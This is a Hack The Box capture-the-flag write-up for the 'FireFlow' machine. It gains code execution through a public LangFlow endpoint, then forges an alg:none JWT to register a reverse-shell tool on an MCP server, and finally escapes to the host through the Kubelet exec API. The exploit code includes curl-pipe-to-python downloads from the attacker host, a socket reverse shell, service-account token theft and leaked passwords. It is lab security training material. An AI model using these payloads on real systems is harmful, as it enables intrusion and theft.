+++
title = "FireFlow - HTB Machine Writeup"
date = 2026-07-06T10:00:00Z
draft = false
tags = ["htb", "langflow", "rce", "kubernetes", "kubelet", "cve", "web exploitation", "ctf"]
categories = ["CTF Writeups"]
+++

# FireFlow - Hack The Box Machine Writeup

**Machine:** FireFlow  
**Category:** Web, Kubernetes, RCE  
**Difficulty:** Meduim  
**Author:** 4mN3s14

## Recon

Nmap scan revealed ports 22 (SSH) and 443 (HTTPS) open with a self-signed cert for `fireflow.htb` and `*.fireflow.htb`:

```bash
sudo nmap -sC -sV -vv -oA fireflow 10.129.244.214

PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu
443/tcp   open     ssl/http  nginx
```

Added `fireflow.htb` and `flow.fireflow.htb` to `/etc/hosts` after visiting the main page.

## Web Enumeration

Found Swagger UI documentation at `/docs` on `flow.fireflow.htb`:

```bash
curl -k https://flow.fireflow.htb/openapi.json -o openapi.json
```

Key API endpoints discovered:

| Endpoint | Description |
|---|---|
| `POST /api/v1/build_public_tmp/{flow_id}/flow` | Build a public flow without auth |
| `GET /api/v1/build_public_tmp/{job_id}/events` | Poll build events without auth |
| `GET /api/v1/flows/public_flow/{flow_id}` | Download public flow definitions |

## Triggering the Public Flow

```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=test-user-123" \
  -d '{}'
```

## Downloading the Flow Definition

```bash
curl -k "https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -b "client_id=test-user-123" -o flow_def_public.json
```

The flow contained a `TextOperations-yvwhG` node with editable Python code — this is the attack surface.

## RCE via LangFlow (CVE-2026-33017)

The LangFlow instance allows custom Python code in component nodes. By modifying the `TextOperations` node's code, we can achieve remote code execution.

### Injecting the Payload

```python
import json

with open('flow_def_public.json', 'r') as f:
    flow = json.load(f)

malicious_code = '''import os
from lfx.custom import Component
from lfx.io import Output
from lfx.schema.message import Message

class TextOperations(Component):
    display_name = "Text Operations"
    outputs = [Output(display_name="Message", name="message", method="get_message")]

    def get_message(self):
        return Message(text=os.popen('id').read())
'''

for node in flow['data']['nodes']:
    if node['id'] == 'TextOperations-yvwhG':
        node['data']['node']['template']['code']['value'] = malicious_code

payload = {
    'inputs': {'input_value': 'trigger'},
    'data': {
        'nodes': flow['data']['nodes'],
        'edges': flow['data']['edges']
    }
}

with open('rce_final.json', 'w') as f:
    json.dump(payload, f)
```

### Executing the Payload

```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=test-user-123" \
  -d @rce_final.json
```

### Polling for Results

```bash
curl -k "https://flow.fireflow.htb/api/v1/build_public_tmp/<JOB_ID>/events" \
  -b "client_id=test-user-123"
```

The output confirmed RCE as `www-data`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Foothold — Reverse Shell

Since direct reverse shell via Python was refused, I hosted a script on an HTTP server and had the target download and execute it.

```bash
# On attacker - start listener and HTTP server
nc -lvnp 4444
python3 -m http.server 8000
```

Created a payload that downloads and executes the reverse shell:

```python
malicious_code = '''import os
from lfx.custom import Component
from lfx.io import Output
from lfx.schema.message import Message

class TextOperations(Component):
    display_name = "Text Operations"
    outputs = [Output(display_name="Message", name="message", method="get_message")]

    def get_message(self):
        os.system('curl http://10.10.15.18:8000/rev.py | python3')
        return Message(text='Shell sent!')
'''
```

Got shell as `www-data` and found credentials in environment variables:

| Credential | Value |
|---|---|
| `LANGFLOW_SUPERUSER` | `langflow` |
| `LANGFLOW_SUPERUSER_PASSWORD` | `n1ghtm4r3_b4_n1ghtf4ll` |

The same password worked for the `nightfall` user via `su`:

```bash
su - nightfall
# Password: n1ghtm4r3_b4_n1ghtf4ll
```

## Lateral Movement — MCP Server

Found `.mcp` config in nightfall's home directory:

| Field | Value |
|---|---|
| User | `langflow-bot` |
| Password | `Langfl0w@mcp2026!` |
| Server | `http://127.0.0.1:30080` |

The MCP (Model Context Protocol) server exposes a tool registration API. The source code revealed a JWT verification bypass:

### JWT Algorithm Confusion

```python
# From main.py — critical vulnerability
if alg == "none":
    payload = jose_jwt.decode(token, key="",
        options={"verify_signature": False},
    )
```

The server accepts JWT with `alg: none`, allowing us to forge tokens with any role, including `admin`.

### Registering a Malicious Tool

```bash
cat > shell.json << 'EOF'
{
  "name": "root_shell",
  "description": "Get a stable reverse shell",
  "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.18\",9999))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
}
EOF

# Register and execute
curl -H "Authorization: Bearer $ADMIN_TOKEN" -X POST http://127.0.0.1:30080/api/v1/tools -d @shell.json
curl -H "Authorization: Bearer $ADMIN_TOKEN" -X POST http://127.0.0.1:30080/mcp \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"root_shell","arguments":{}},"id":7}'
```

This landed a shell inside the MCP container.

## Privilege Escalation — Kubernetes Escape

The MCP server container had a Kubernetes service account token mounted:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

The service account had a `ClusterRoleBinding` granting access to nodes via the Kubernetes API.

### Checking Permissions

```bash
curl -k -s -H "Authorization: Bearer $SA_TOKEN" \
  -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"spec":{"resourceAttributes":{"verb":"get","resource":"nodes","subresource":"proxy"}}}'
```

Response: `"allowed": true` — we could access the Kubelet API.

### Finding a Privileged Pod

```bash
curl -k -s -H "Authorization: Bearer $SA_TOKEN" \
  https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods | \
  python3 -c "import sys, json; data=json.load(sys.stdin); \
  [print(f\"{item['metadata']['namespace']}/{item['metadata']['name']}\") \
  for item in data['items'] if any(c.get('securityContext', {}).get('privileged') \
  for c in item['spec']['containers'])]"
```

Found: `monitoring/prometheus-prometheus-node-exporter-nmntq` (container: `node-exporter`)

### Exec on Host via Kubelet WebSocket

Used the Kubelet exec API over WebSocket to run commands on the host:

```python
# kube_exec.py
import asyncio, ssl, sys, websockets

NODE = "10.129.244.214"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"

with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
    TOKEN = f.read().strip()

COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
           f"?output=1&error=1&stdin=0&tty=0&{args}")

    async with websockets.connect(url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    channel = data[0]
                    payload = data[1:]
                    if channel == 0:
                        sys.stdout.write(payload.decode("utf-8", errors="replace"))
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

### Reading the Root Flag

```bash
python3 kube_exec.py "cat /host/root/root/root.txt"
```

The host filesystem was mounted in the privileged container at `/host`, giving us direct access to the root flag.

## Summary

The attack chain for FireFlow involved:

1. **Public LangFlow endpoint** — No authentication required to build flows
2. **CVE-2026-33017 (LangFlow RCE)** — Custom Python code injection in flow components
3. **Credential reuse** — LangFlow superuser password reused for `nightfall` system user
4. **MCP Server JWT bypass** — `alg: none` allowed admin token forgery
5. **Tool registration RCE** — Arbitrary Python execution on MCP server
6. **Kubernetes service account** — Cluster-reader binding allowed Kubelet API access
7. **Privileged container escape** — Kubelet exec on node-exporter pod to read root flag

## Key Takeaways

- Never expose LangFlow's public build endpoint without authentication
- JWT libraries should reject `alg: none` tokens by default
- Kubernetes service accounts should follow least-privilege principles
- Always verify the Kubelet API is firewalled from pods
